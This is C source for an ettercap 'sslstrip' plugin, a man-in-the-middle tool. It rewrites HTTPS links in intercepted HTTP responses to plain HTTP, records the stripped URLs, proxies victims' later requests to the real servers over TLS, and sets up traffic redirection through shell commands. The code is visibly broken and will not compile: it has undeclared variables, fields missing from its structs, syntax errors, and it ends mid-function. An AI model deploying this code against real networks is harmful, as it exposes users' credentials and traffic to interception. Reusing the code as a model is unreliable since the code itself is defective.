/*
    sslstrip -- ettercap plugin -- SSL Strip per Moxie (http://www.thoughtcrime.org/software/sslstrip/)
   
    Copyright (C) Ettercap team
    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/

#include <ec.h>
#include <ec_inet.h>
#include <ec_plugins.h>
#include <ec_hook.h>
#include <ec_send.h>
#include <ec_socket.h>
#include <ec_threads.h>

#include <zlib.h>

#ifdef HAVE_SYS_POLL_H
#include <sys/poll.h>
#endif

#ifdef HAVE_OPENSSL
#include <openssl/ssl.h>

/*
 * This plugin will basically replace all https links sent to the user's browser with http 
 * but keep track of those https links to send a proper HTTPS request to the links when requested.
 */


#define URL_PATTERN "(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)"

#define REQUEST_TIMEOUT 1200 /* If a request has not been used in 1200 seconds, remove it from list */

#define HTTP_RETRY 5
#define HTTP_WAIT 10

#define BREAK_ON_ERROR(x,y,z) do {                      \
	if (x == -EINVALID) {      			\
		SAFE_FREE(z.DATA.disp_data); 		\
		http_initialize_po(&z, z.DATA.data);	\
		z.len = 64;				\
		z.L4.flags = TH_RST;			\
		packet_disp_data(&z, z.DATA.data, z.DATA.len); \
		http_parse_packet(y, HTTP_SERVER, &z);  \
		http_wipe_connection(y);		\
		SAFE_FREE(z.DATA.data);			\
		SAFE_FREE(z.DATA.disp_data);		\
	}						\
} while(0)


/* Zlib stuff */
#define CHUNK 16384

static unsigned gz_magic[2] = {0x1f, 0x8b}; /* gzip magic header */
static char dummy_head[2] =
{
	0x8 + 0x7 * 0x10,
        (((0x8 + 0x7 * 0x10) * 0x100 + 30) / 31 * 31) & 0xFF,
};

/* lists */
struct ssl_connection {
	int fd;
	struct ip_addr server;
	SSL *ssl;
};

struct http_ident {
	u_int32 magic;
	#define HTTP_MAGIC 0x0501e77f
	struct ip_addr L3_src;
	u_int16 L4_src;
	u_int16 L4_dst;
};


struct http_header {
	char name[30];
	char value[512];
	LIST_ENTRY(http_header) next;
};


struct http_response {
	u_char code[30];
	LIST_HEAD (, http_header) headers;
	u_char *body;
	size_t content_length;
	size_t received;
	char compressed:1;
#define COMP_GZIP 1
#define COMP_DEFLATE 2

#define HTTP_COMPLETE 0x0010
#define HTTP_PARTIAL  0x0020
#define HTTP_ERROR    0x0030


	int comp_method;	
	struct ip_addr server;
	struct ip_addr client;
	LIST_ENTRY(http_response) next;
};


struct http_request {
	LIST_HEAD (, http_header) headers;	
	char *url;
	time_t last_used;
        char   encrypted;
	size_t len;
	u_char *content;
	//struct http_response response; - Do we need this here?
	LIST_ENTRY(http_request) next;

};


struct http_connection {
	int32 fd[2]; /* 0->Client, 1->Server */
	u_int16 port[2];
	struct ip_addr ip[2];
	struct ip_addr server;
	#define HTTP_CLIENT 0
	#define HTTP_SERVER 2
	struct http_request request;
	struct http_response response;
};

/* globals */
static LIST_HEAD (, http_request) http_requests;
static LIST_HEAD (, http_response) http_responses;
static SSL_CTX *ssl_ctx_server;
static struct pollfd *poll_fd = NULL;
static int main_fd;
static uint_16 bind_port;

/* protos */
int plugin_load(void *);
static int sslstrip_init(void *);
static int sslstrip_fini(void *);
static void sslstrip(struct packet_object *po);
static void sslstrip_dummy(struct packet_object *po);

/* http stuff */
static int IsHttpResponse(u_char *data);
static void Find_Url(u_char *to_parse, char **ret);
static int decompress(u_char *data, size_t len, int mode, u_char **ptr);
static void parse_headers(u_char *data, size_t len, struct http_response *response);
static size_t parse_body(u_char *data, size_t len, struct http_response *response);
static void append_http_response(u_char *data, size_t len, struct http_response *response);
static int parse_http_response(u_char *data, size_t len, struct http_response *response);
static size_t get_content_length(struct http_response *response);
static int find_http_response(struct ip_addr *client, struct ip_addr *server, struct http_response **response);
static int grow_packet_object(u_char *data, size_t len, struct packet_object *po);

static int http_connect_server(struct http_connection *);
static size_t http_create_ident(void **, struct packet_object *);
static int http_sync_conn(struct http_connection *);
static int http_replace_https(struct http_request *r, struct packet_object *po);
static int http_get_peer(struct http_connection *);
static int http_write(struct http_request *r, int direction, u_char *data, size_t packet_len);
static int http_read(struct http_connection *c, int direction, u_char *data, size_t *len);
static int http_insert_redirect(u_int16 dport);
static int http_remove_redirect(u_int16 port);
static void http_initialize_po(struct packet_object *po, u_char *p_data);
static void http_parse_packet(struct http_connection *connection, int direction, struct packet_object *po);
static void http_wipe_connection(struct http_connection *connection);
static void http_handle_request(struct http_connection *connection, struct packet_object *po);
static void http_remove_https(struct http_connection *connection, struct packet_object *po);

/* thread stuff */
static int http_bind_wrapper(void);
EC_THREAD_FUNC(http_accept_thread);
static EC_THREAD_FUNC(http_child_thread);

/* SSL stuff */
static int ssl_sync_conn(struct http_request *r);
static int ssl_connect_server(struct http_request *r);
static int ssl_sync_ssl(struct http_request *r);
static int ssl_connect_ssl(SSL *ssl_sk);
static int ssl_write(struct http_request *ssl, u_char *data, size_t packet_len);
static int ssl_read(struct http_request *ssl, struct packet_object *po);
static void ssl_wipe_connection(struct http_request *r);

struct plugin_ops sslstrip_ops = {
	ettercap_version:	EC_VERSION, /* must match global EC_VERSION */
	name:			"sslstrip",
	info:			"SSLStrip plugin",
	version:		"1.0",
	init:			&sslstrip_init,
	fini:			&sslstrip_fini,
};

int plugin_load(void *handle)
{
	return plugin_register(handle, &sslstrip_ops);
}

static int sslstrip_init(void *dummy)
{

        /* if ettercap is forging SSL certs, we can't run */
	if (GBL_OPTIONS->ssl_mitm) {
		USER_MSG("SSLStrip: Cannot run SSLStrip Plugin while forging SSL certificates\n");
		return PLUGIN_FINISHED;
	}

	/* initialize lists, if fails exit */
	SSL_library_init();
        ssl_ctx_server = SSL_CTX_new(SSLv23_client_method());

	if (ssl_ctx_server == NULL) {
		ON_ERROR(ssl_ctx_server, NULL, "Could not initialize SSL context");
		return PLUGIN_FINISHED;
	}

	if (http_bind_wrapper() != ESUCCESS) {
		USER_MSG("SSLStrip: Could not set up HTTP redirect\n");
		return PLUGIN_FINISHED;
	}
	
	/* start HTTP accept thread */
	ec_thread_new("http_accept_thread", "wrapper for HTTP connections", &http_accept_thread, NULL);

	/* add hook point in the dissector for HTTP traffic */
	//hook_add(HOOK_PROTO_HTTP, &sslstrip);
	return PLUGIN_RUNNING;
}

static int sslstrip_fini(void *dummy)
{
	/* Clear lists and exit */

	SSL_CTX_free(ssl_ctx_server);	
	/* remove hook */
	//hook_del(HOOK_PROTO_HTTP, &sslstrip);

	http_remove_redirect(bind_port);

	/* stop accept wrapper */
	pthread_t pid = ec_thread_getpid("http_accept_thread");
	
	if (!pthread_equal(pid, EC_PTHREAD_NULL))
		ec_thread_destroy(pid);

	return PLUGIN_FINISHED;
}

void sslstrip(struct packet_object *po)
{
	struct http_request *r;


	if (!IsHttpResponse(po->DATA.data)) {
		DEBUG_MSG("SSLStrip: Parsing HTTP request");
		char *url;
		SAFE_CALLOC(url, 1, 128);


		memset(url, '\0', 128);
		Find_Url(po->DATA.data, &url);

		LIST_FOREACH(r, &http_requests, next) {
			if(!strcmp(r->url, url) && ip_addr_cmp(&r->client, &po->L3.src) == 0) {
				DEBUG_MSG("SSLStrip: Found request in list");
				/* Found URL in list, must make HTTPS request instead of HTTP */
				
				/* Let's set the packet to be dropped, this way it won't be sent to port 80 of the server */
				po->flags |= PO_DROPPED;
				
				if (ssl_sync_conn(r) != ESUCCESS) {
					DEBUG_MSG("Failed to connect to HTTPs server");
					return;
				}
		
				/* Now that we've established a HTTP connection with the server, send request */
				if(ssl_write(r, po->DATA.data, po->DATA.len) != ESUCCESS)
					DEBUG_MSG("Could not write SSL request");

				/* Read SSL response and send it back to client */
				

				/* Wipe SSL connection */
				ssl_wipe_connection(r);

				/* Update the last used timestamp of the request */
				r->last_used = time(NULL);
	
				/* So the response should come to us via the normal channels -> dissector -> plugin */
				break;
			}
		}		

		SAFE_FREE(url);
	} else {
		/* Parse response and add to http_requests list any HTTPS links found */
		DEBUG_MSG("SSLStrip: Parsing HTTP response");
		DEBUG_MSG("DATA: %s", po->DATA.data);
		struct http_response *response = NULL;

		if (find_http_response(&po->L3.dst, &po->L3.src, &response) != ESUCCESS) {
			SAFE_CALLOC(response, 1, sizeof(struct http_response));
			if(parse_http_response(po->DATA.data, po->DATA.len, response) == HTTP_ERROR)
				return;
			response->client = po->L3.dst;
			response->server = po->L3.src;
		} else {
			/* If response was found, we're just appending to it */
			if (!memmem(po->DATA.data, po->DATA.len, "HTTP/1.1", 8)) {
				append_http_response(po->DATA.data, po->DATA.len, response);
			}
		}

		DEBUG_MSG("CONTENT LENGTH: %lu RECEIVED: %lu", response->content_length, response->received);

		if (response->content_length != response->received) {
			/* Don't send to client until we have received everything */
			po->flags |= PO_DROPPED;
			
			/* Let's send an ACK back to the host to make sure that it keeps sending us data */
		//	send_tcp(&po->L3.dst, &po->L3.src, po->L4.dst, po->L4.src, po->L4.ack, po->L4.seq+1, 0x10);
			return;
		}

		DEBUG_MSG("RECEIVED ALL CONTENT");
		
		


		/* 
		 * Check and see if response is compressed with gzip or deflate, if so deflate 
  		 */
		if (response->compressed) {
			u_char *decompressed;
			SAFE_CALLOC(decompressed, 1, 131640);
			DEBUG_MSG("DECOMPRESSING");
			if (decompress(response->body, response->received, response->comp_method, &decompressed) != ESUCCESS) {
				DEBUG_MSG("DECOMPRESS FAILED");
				SAFE_FREE(decompressed);
				LIST_REMOVE(response, next);
				SAFE_FREE(response->body);
				SAFE_FREE(response);
				return;
			}

			response->body = (u_char *)strdup((char *)decompressed);
			response->content_length = strlen((char *)decompressed);
			SAFE_FREE(decompressed);
		}

		u_int8 *ptr, *tmp;
		u_int8 *end;
		size_t len;
		size_t slen = strlen("https://");
		char *pattern = "https://";
		char *with = "http://";
		size_t with_len = strlen(with);

		/* If no HTTPS links were found, return and do not add to list */
		if (!memmem(response->body, response->content_length, pattern, slen)) {
			DEBUG_MSG("SSLStrip: Pattern not found");
			LIST_REMOVE(response, next);
			SAFE_FREE(response->body);
			SAFE_FREE(response);
			return;
		}

		DEBUG_MSG("SSLStrip: Found https");
		ptr = response->body;
		end = ptr + response->content_length;
		
		do {
			len = end - ptr;
			ptr = memmem(ptr, len, pattern, slen);


			if (!ptr) /* String not found, exit */
				break;

			/* Determine URL to add to list */
			//ptr is at http
			tmp = ptr;
			tmp += slen;
			
			u_int8 *link_end=(u_int8 *)strchr((const char*)tmp, '"');
			link_end--;

			u_int8 *url = (u_int8 *)(link_end -tmp);

			SAFE_CALLOC(r, 1, sizeof(struct http_request));

			r->client = po->L3.dst;
			r->ssl_conn.server = po->L3.src;

			r->url = (char *)url;
			r->last_used = time(NULL);

			//Add to list
			LIST_INSERT_HEAD(&http_requests, r, next);
			
			//Continue to modify packet

			len = end - ptr - slen;
			po->DATA.delta += with_len - slen;
			po->DATA.len += with_len - slen;

			memmove(ptr + with_len, ptr + slen, len);
			memcpy(ptr, with, with_len);
			ptr += with_len;

			end += with_len - slen;

			/* mark packet as modified */
			po->flags |= PO_MODIFIED;
		} while (ptr != NULL && ptr < end);

		/* Remove the http_response from the list since we already processed it */
		LIST_REMOVE(response, next);
		SAFE_FREE(response->body);
		SAFE_FREE(response);

	}

	/* Iterate through all http_request and remove any that have not been used lately */
	struct http_request *tmp;
	time_t now = time(NULL);

	LIST_FOREACH_SAFE(r, &http_requests, next, tmp) {
		if(now - r->last_used >= REQUEST_TIMEOUT) {
			LIST_REMOVE(r, next);
			SAFE_FREE(r);
		}
	}
}

/* Determines if packet is an HTTP response or request */
// returns 1 if response
static int IsHttpResponse(u_char *data) 
{
	char *d = (char *)data;
	if (!strncmp(d, "GET", 3) || !strncmp(d, "POST", 4) || !strncmp(d, "HEAD", 4) ||
            !strncmp(d, "TRACE", 5) || !strncmp(d, "DELETE", 6))
		return 0;
	return 1;
}

/* Unescape the string */
static void Decode_Url(u_char *src)
{
   u_char t[3];
   u_int32 i, j, ch;

   /* Paranoid test */
   if (!src)
      return;

   /* NULL terminate for the strtoul */
   t[2] = 0;

   for (i=0, j=0; src[i] != 0; i++, j++) {
      ch = (u_int32)src[i];
      if (ch == '%' && isxdigit((u_int32)src[i + 1]) && isxdigit((u_int32)src[i + 2])) {
         memcpy(t, src+i+1, 2);
         ch = strtoul((char *)t, NULL, 16);
         i += 2;
      }
      src[j] = (u_char)ch;
   }
   src[j] = 0;
}

/* Gets the URL from the request */
static void Find_Url(u_char *to_parse, char **ret)
{
   u_char *fromhere, *page=NULL, *host=NULL;
   u_int32 len;
   char *tok;

   if (!strncmp((char *)to_parse, "GET ", 4))
      to_parse += strlen("GET ");
   else if (!strncmp((char *)to_parse, "POST ", 5))
      to_parse += strlen("POST ");
   else
      return;

   /* Get the page from the request */
   page = (u_char *)strdup((char *)to_parse);
   ec_strtok((char *)page, " HTTP", &tok);

   /* If the path is relative, search for the Host */
   if ((*page=='/') && (fromhere = (u_char *)strstr((char *)to_parse, "Host: "))) {
      host = (u_char *)strdup( (char *)fromhere + strlen("Host: ") );
      ec_strtok((char *)host, "\r", &tok);
   } else
      host = (u_char*)strdup("");

   len = strlen((char *)page) + strlen((char *)host) + 2;
   SAFE_CALLOC(*ret, len, sizeof(char));
   snprintf(*ret, len, "%s%s", host, page);

   SAFE_FREE(page);
   SAFE_FREE(host);

   Decode_Url((u_char *)*ret);
}

/* SSL functions */

static int ssl_sync_conn(struct http_request *r)
{
	if(ssl_connect_server(r) != ESUCCESS)
		return -EINVALID;

	/* set to non-blocking */
	set_blocking(r->ssl_conn.fd, 0);

	if (ssl_sync_ssl(r) != ESUCCESS)
		return -EINVALID;

	return ESUCCESS;
}
static int ssl_connect_server(struct http_request *r)
{
	char *dest_ip;
	
	dest_ip = strdup(int_ntoa(ip_addr_to_int32(&r->ssl_conn.server)));

	if (!dest_ip || (r->ssl_conn.fd = open_socket(dest_ip, ntohs(443)) < 0)) {
		SAFE_FREE(dest_ip);
		DEBUG_MSG("Could not open socket");
		return -EINVALID;
	}

	SAFE_FREE(dest_ip);
	return ESUCCESS;
}

static int ssl_sync_ssl(struct http_request *r)
{
	r->ssl_conn.ssl = SSL_new(ssl_ctx_server);
	SSL_set_connect_state(r->ssl_conn.ssl);
	SSL_set_fd(r->ssl_conn.ssl, r->ssl_conn.fd);	

	if (ssl_connect_ssl(r->ssl_conn.ssl) != ESUCCESS)
		return -EINVALID;

	return ESUCCESS;
}

static int ssl_connect_ssl(SSL *ssl_sk)
{
	int loops = (GBL_CONF->connect_timeout * 10e5) / 50000;
	int ret, ssl_err;

#if !defined(OS_WINDOWS)
	struct timespec tm;
	tm.tv_sec = 0;
	tm.tv_nsec = 50000 * 1000;
#endif

	do {
		if ((ret = SSL_connect(ssl_sk)) == 1)
			return ESUCCESS;

		ssl_err = SSL_get_error(ssl_sk, ret);

		if (ssl_err != SSL_ERROR_WANT_READ && ssl_err != SSL_ERROR_WANT_WRITE)
			return -EINVALID;

		/* sleep for a bit */

#ifndef OS_WINDOWS
		nanosleep(&tm, NULL);
#else
		usleep(50000);
#endif
	} while (loops--);
	
	return -EINVALID;
}

/* write data */
static int ssl_write(struct http_request *r, u_char *data, size_t packet_len)
{
	int32 len, not_written, ret_err;
#ifndef OS_WINDOWS
	struct timespec tm;
	tm.tv_sec = 1;
	tm.tv_nsec = 0;
#else
	int timeout 1000;
#endif

	if (packet_len == 0)
		return ESUCCESS;

	do {
		not_written = 0;
		/* write packet data */
		len = SSL_write(r->ssl_conn.ssl, data, packet_len);

		if (len <= 0) {
			ret_err = SSL_get_error(r->ssl_conn.ssl, len);
			if (ret_err == SSL_ERROR_WANT_READ || ret_err == SSL_ERROR_WANT_WRITE)
				not_written = 1;
			else
				return -EINVALID;
		}

		/* Do Some OS's use partial writes for SSL? */
		if (len < packet_len && !not_written) {
			packet_len -= len;
			data += len;
			not_written = 1;
		}

#ifdef OS_WINDOWS
		usleep(timeout);
#else
		nanosleep(&tm, NULL);
#endif

	} while(not_written);
	return ESUCCESS;
}

static int ssl_read(struct http_request *r, struct packet_object *po)
{
	int len, ret_err;
	
	len = SSL_read(r->ssl_conn.ssl, po->DATA.data, 1024);

	if (len <= 0) {
		ret_err = SSL_get_error(r->ssl_conn.ssl, len);

		if (ret_err == SSL_ERROR_WANT_READ || ret_err == SSL_ERROR_WANT_WRITE)
			return -ENOTHANDLED;
		else
			return -EINVALID;
	}

	po->len = len;
	po->DATA.len = len;
	po->L4.flags |= TH_PSH;

	po->DATA.data[po->DATA.len] = 0;
	packet_destroy_object(po);
	packet_disp_data(po, po->DATA.data po->DATA.len);

	return ESUCCESS;

}

static void ssl_wipe_connection(struct http_request *r)
{
	if (r->ssl_conn.ssl)
		SSL_free(r->ssl_conn.ssl);

	close_socket(r->ssl_conn.fd);
}

/* HTTP handling functions */
static size_t get_content_length(struct http_response *response)
{
	struct http_header *h;
	size_t len;
	
	LIST_FOREACH(h, &response->headers, next) {
		if(!strcmp(h->name, "Content-Length:")) {
			len = atoi(h->value);	
			break;
		}
	}

	return len;
}

static void append_http_response(u_char *data, size_t len, struct http_response *res)
{
	//res->body already is allocated for Content-Length:
	//Simply add the offset of received bytes and copy the buffer 
	memcpy(res->body+res->received, data, len);
	res->received += len;
}

static int parse_http_response(u_char *data, size_t len, struct http_response *res)
{

	//Get code first
	
	if(!memmem(data, len, "HTTP/1.1", 8)) {
		return HTTP_ERROR;
	}

	u_char *p_data = data;
	u_char *end = (u_char *)strstr((char *)p_data, "\r\n");
	size_t code_len = end - p_data;
	memset(res->code, '\0', 30);

	strncpy((char *)res->code, (char *)p_data, code_len);


	parse_headers(data, len, res);

	//Make sure we're dealing with text and determine content-encoding
	struct http_header *h;
	int remove = 0;

	LIST_FOREACH(h, &res->headers, next) {
		if (!strcmp(h->name, "Content-Encoding:")) {
			if(!strcmp(h->value, "gzip")) {
				res->compressed = 1;
				res->comp_method = COMP_GZIP;
			} else if (!strcmp(h->value, "deflate")) {
				res->compressed = 1;
				res->comp_method = COMP_DEFLATE;
			}
		} else if (!strcmp(h->name, "Content-Type:")) {
			if(!strstr(h->value, "text")) {
				remove = 1;
			}
		}
	}

	if (remove) {
		SAFE_FREE(res);
		return HTTP_ERROR;
	}

	res->content_length = get_content_length(res);
	SAFE_MALLOC(res->body, res->content_length+1);
	memset(res->body, '\0', res->content_length+1);

	res->received = parse_body(data, len, res);


	LIST_INSERT_HEAD(&http_responses, res, next);

	if (res->received == res->content_length)
		return HTTP_COMPLETE;	
	else
		return HTTP_PARTIAL;
};

static size_t parse_body(u_char *data, size_t len, struct http_response *res)
{
	u_char *p_data = data;
	u_char *end = p_data + len;
	//Look for \r\n\r\n to mark the beginning of the body section

	p_data = (u_char *)strstr((char *)p_data, "\r\n\r\n");

	p_data += 4; //Move forward 4 bytes	
	size_t received = end - p_data;

	memcpy(res->body, p_data, received);

	return received;
}

static void parse_headers(u_char *data, size_t len, struct http_response *response)
{
	struct http_header *h;

	u_char *p_data, *end;
	u_char *tmp;
	
	end = (u_char *)strstr((char *)data, "\r\n\r\n"); //Look for empty line that marks the end of the header section	


	size_t header_len = end - data;

	SAFE_CALLOC(p_data, 1, header_len+1);
	memset(p_data, '\0', header_len+1);
	memcpy(p_data, data, header_len);
	tmp = p_data; //Keep for free

	//Skip the first line (ie. HTTP/1.1 200 OK\r\n")
	p_data = (u_char *)strstr((char *)p_data, "\r\n");
	p_data += 2;


	if(*p_data=='\0')
		return; //No headers

	while(p_data) {
		int x = 0;
		SAFE_CALLOC(h, 1, sizeof(struct http_header));
		memset(h->name, '\0', 30);
		memset(h->value, '\0', 512);

		while(*p_data != ' ')
			h->name[x++] = *p_data++;
		x=0;
		p_data++; //skip space

		while(*p_data != '\r' && *p_data != '\0')
			h->value[x++]=*p_data++;

			
		LIST_INSERT_HEAD(&response->headers, h, next);

		if(*p_data != '\0')
			//at \r skip 2 bytes
			p_data += 2;
		else
			break;
	};

	SAFE_FREE(tmp);
}

static int find_http_response(struct ip_addr *client, struct ip_addr *server, struct http_response **response)
{
	struct http_response *r;
	
	LIST_FOREACH(r, &http_responses, next) {
		if(ip_addr_cmp(client, &r->client) == 0 && ip_addr_cmp(server, &r->server) == 0 && r->received != r->content_length) {
			*response = r;
			break;
		} 
	}

	if (r)
		return ESUCCESS;
	else
		return -ENOTFOUND;
}

static int http_insert_redirect(u_int16 dport)
{
	char asc_dport[16];
	int ret_val, i=0;
	char *command, *p;
	char **param = NULL;

	if (GBL_CONF->redir_command_on == NULL)
		return -EFATAL;

	snprintf(asc_dport, 16, "%u", dport);

	command = strdup(GBL_CONF->redir_command_on);
	str_replace(&command, "%iface", GBL_OPTIONS->iface);
	str_replace(&command, "%port", 80);
	str_replace(&command, "%rport", asc_dport);

	DEBUG_MSG("http_insert_redirect: [%s]", command);

	/* split the string into the parameter array */
	for (p = strsep(&command, " "); p!=NULL; p = strsep(&command, " ")) {
		SAFE_REALLOC(param, (i+1) * sizeof(char *));
		param[i++] = strdup(p);
	}

	SAFE_REALLOC(param, (i+1) * sizeof(char *));
	param[i] = NULL;

	switch(fork()) {
		case 0:
			execvp(param[0], param);
			exit(EINVALID);
		case -1:
			SAFE_FREE(param);
			return -EINVALID;
		default:
			SAFE_FREE(param);
			wait(&ret_val);
			if (ret_val == EINVALID)
				return -EINVALID;
	}

	return ESUCCESS;
}

static int http_remove_redirect(u_int16 port)
{
        char asc_dport[16];
        int ret_val, i=0;
        char *command, *p;
        char **param = NULL;

        if (GBL_CONF->redir_command_off == NULL)
                return -EFATAL;

        snprintf(asc_dport, 16, "%u", dport);

        command = strdup(GBL_CONF->redir_command_on);
        str_replace(&command, "%iface", GBL_OPTIONS->iface);
        str_replace(&command, "%port", 80);
        str_replace(&command, "%rport", asc_dport);

        DEBUG_MSG("http_insert_redirect: [%s]", command);

        /* split the string into the parameter array */
        for (p = strsep(&command, " "); p!=NULL; p = strsep(&command, " ")) {
                SAFE_REALLOC(param, (i+1) * sizeof(char *));
                param[i++] = strdup(p);
        }

        SAFE_REALLOC(param, (i+1) * sizeof(char *));
        param[i] = NULL;

        switch(fork()) {
                case 0:
                        execvp(param[0], param);
                        exit(EINVALID);
                case -1:
                        SAFE_FREE(param);
                        return -EINVALID;
                default:
                        SAFE_FREE(param);
                        wait(&ret_val);
                        if (ret_val == EINVALID)
                                return -EINVALID;
        }

        return ESUCCESS;
}

static int http_accept_thread(void)
{
	struct http_connection *connection = NULL;
	u_int len = sizeof(struct sockaddr_in), i;
	struct sockaddr_in client_sin;

	ec_thread_init();

	DEBUG_MSG("SSLStrip: http_accept_thread initialized and ready");

	poll_fd.fd = main_fd;
	poll_fd.events = POLLIN;

	LOOP {
		poll(poll_fd, 1, -1);
		SAFE_CALLOC(connection, 1, sizeof(struct http_connection));
		connection->fd[HTTP_CLIENT]= accept(poll_fd.fd, (struct sockaddr *)&client_sin, &len);

		if (request->fd == -1) {
			SAFE_FREE(request);
			continue;
		}

		ip_addr_init(&connection->ip[HTTP_CLIENT], AF_INET, (char *)&(client_sin.sin_addr.s_addr));
		connection->port[HTTP_CLIENT] = client_sin.sin_port;
		connection->port[HTTP_SERVER] = htons(80);

		/* create detached thread */
		ec_thread_new_detached("http_child_thread", "http child", &http_child_thread, connection, 1);	

	return NULL;
}

static int http_get_peer(struct http_connection *connection)
{
	struct ec_session *s = NULL;
	struct packet_object po;
	void *ident= NULL;
	int i;

	memcpy(&po.L3.src, &connection->ip[HTTP_CLIENT], sizeof(struct ip_addr));
	po.L4.src = connection->port[HTTP_CLIENT];
	po.L4.dst = connection->port[HTTP_SERVER]; 

	http_create_ident(&ident, &po);

#ifndef OS_WINDOWS
	struct timespec tm;
	tm.tv_sec = HTTP_WAIT;
	tv.tv_nsec = 0;
#endif

	/* Wait for sniffing thread */
	for (i=0; i<HTTP_RETRY && session_get_and_del(&s, ident, HTTP_IDENT_LEN)!=ESUCCESS; i++)
#ifndef OS_WINDOWS
	nanosleep(&tm, NULL);
#else	
	usleep(HTTP_WAIT);
#endif

	if (i==HTTP_RETRY) {
		SAFE_FREE(ident);
		return -EINVALID;
	}

	memcpy(&connection->ip[HTTP_SERVER], s->data, sizeof(struct ip_addr));
	
	SAFE_FREE(s->data);
	SAFE_FREE(s);
	SAFE_FREE(ident);

	return ESUCCESS;

}


static size_t http_create_ident(void **i, struct packet_object *po)
{
	struct http_ident *ident;

	SAFE_CALLOC(ident, 1, sizeof(struct http_ident));

	ident->magic = HTTP_MAGIC;

	memcpy(&ident->L3_src, &po->L3.src, sizeof(struct ip_addr));
	ident->L4_src = po->L4.src;
	ident->L4_dst = po->L4.dst;

	/* return the ident */
	*i = ident;
	return sizeof(struct http_ident);
}
static http_sync_conn(struct http_connection *connection) 
{
	if (http_get_peer(connection) != ESUCCESS)
		return -EINVALID;

	if (http_connect_server(request) != ESUCCESS)
		return -EINVALID;

	set_blocking(request->fd, 0);
	set_blocking(request->http_conn->fd, 0);

	return ESUCCESS;
}

static int http_connect_server(struct http_connection *connection)
{
	char *dest_ip;
	dest_ip = strdup(int_ntoa(ip_addr_to_int32(connection->ip[HTTP_SERVER].addr)));

	if (!dest_ip || connection->fd[HTTP_SERVER] = open_socket(dest_ip, ntohs(connection->port[HTTP_SERVER])) < 0) {
		SAFE_FREE(dest_ip);
		DEBUG_MSG("Could not open socket");
		return -EINVALID;	
	}

	SAFE_FREE(dest_ip);
	return ESUCCESS;
}

static int http_read(struct http_connect *connection, int direction, u_char *data, size_t *len)
{
	int len, ret_err;

	if (buffer==NULL)
		return -EINVALID;

	*len = read(connection->fd[direction], data, 1024);

	if (*len < 0) {
		int err = GET_SOCK_ERRNO();
		if (err == EINTR || err == EAGAIN)
			return -ENOTHANDLED;
		else
			return -EINVALID;
	}

	if (*len == 0)
		return -EINVALID;

	return ESUCCESS;
}

EC_THREAD_FUNC(http_child_thread)
{
	struct packet_object po;
	int direction, ret_val, data_read;
	struct http_connection *connection;
#ifndef OS_WINDOWS
	struct timespec tm;
	tm.tv_sec = 0;
	tm.tv_nsec = 3000*1000;
#else
	int timeout = 3000;
#endif

	connection = (struct http_connection *)args;
	ec_thread_init();

	connection->fd[HTTP_SERVER] = -1; //Don't want to close STDIN

	/* Connect to real HTTP server */
	if (http_sync_conn(request) == -EINVALID) {
		if (connection->fd[HTTP_CLIENT] != -1)
			close_socket(connection->fd[HTTP_CLIENT]);
		SAFE_FREE(connection);	
		ec_thread_exit();
	}


	/* A fake SYN ACK */
	http_initialize_po(&po, NULL);
	po.len = 64;
	po.L4.flags = (TH_SYN | TH_ACK);
	packet_disp_data(&po, po.DATA.data, po.DATA.len);
	http_initialize_po(&po, po.DATA.data);
	u_char *data = NULL;
	size_t len = 0;

	data = (u_char *)malloc(1024);
	
	if (!data){
		SAFE_FREE(connection);
		ec_thread_exit();
	}	

	data_read = 0;

	LOOP {

		do { 
			ret_val = http_read(connection, direction, data, &len);
			
			if (ret_val == ESUCCESS) {
				data_read = 1;
				grow_packet_object(data, len, &po);
			}
		} while (ret_val != -EINVALID);

		//We read the entire request/response

		BREAK_ON_ERROR(ret_val, connection, po);

		/* if we read data, write it to real server */
		if (data_read) {
			/* We got a response, change https with http */
			if (direction) {
				http_remove_https(connection, &po);
			} else {
				/* Look for request and if it matches a HTTPs link, send it to SSL server */
				http_handle_request(connection, &po);
			}

			//response->body has the new body

			http_parse_packet(connection, direction, &po);

			if (po.flags & PO_DROPPED)
				continue;

			ret_val = http_write(connection, !direction, &po);
			BREAK_ON_ERROR(ret_val, connection, po);

			http_initialize_po(&po, po.DATA.data);
		}
		
	}

	return NULL;
	
}


static int grow_packet_object(u_char *data, size_t len, struct packet_object *po)
{
	u_char *d = po->DATA.data;
	size_t current = po->DATA.len;
	u_char *new;

	new = (u_char *)realloc(po->DATA.data, current+len);

	if (new == d) //failed to realloc
		return -EINVALID;

	//Copy data to newly created space
	memcpy(new, data, len);
}

static void http_handle_request(struct http_connection *connection, struct packet_object *po)
{
	char *url;
		
	SAFE_CALLOC(url, 1, 128);

	memset(url, '\0', 128);

	Find_Url(po->DATA.data, &url);

 	LIST_FOREACH(r, &http_requests, next) {
        	if(!strcmp(r->url, url) && ip_addr_cmp(&connection->ip[HTTP_CLIENT], &po->L3.src) == 0) {
                                DEBUG_MSG("SSLStrip: Found request in list");
                                /* Found URL in list, must make HTTPS request instead of HTTP */

                                /* Let's set the packet to be dropped, this way it won't be sent to port 80 of the server */
                                po->flags |= PO_DROPPED;

                                if (ssl_sync_conn(r) != ESUCCESS) {
                                        DEBUG_MSG("Failed to connect to HTTPs server");
                                        return;
                                }

                                /* Now that we've established a HTTP connection with the server, send request */
                                if(ssl_write(r, po->DATA.data, po->DATA.len) != ESUCCESS)
                                        DEBUG_MSG("Could not write SSL request");

                                /* Read SSL response and send it back to client */
				//copy response to po

                                /* Wipe SSL connection */
                                ssl_wipe_connection(r);

                                /* Update the last used timestamp of the request */
                                r->last_used = time(NULL);

                                /* So the response should come to us via the normal channels -> dissector -> plugin */
                                break;
                        }

		}
	}

	SAFE_FREE(url);
}

static void http_remove_https(struct http_connection *connection, struct packet_object *po)
{
	struct http_response response = connection->response;	

	if (parse_http_response(po->DATA.data, po->DATA.len, &response) == HTTP_ERROR) {
		DEBUG_MSG("Error parsing HTTP response");
		return;
	}

	response->client = connection->ip[HTTP_CLIENT];
	response->server = connection->ip[HTTP_SERVER];

        /* 
         * Check and see if response is compressed with gzip or deflate, if so deflate 
        */
        if (response->compressed) {
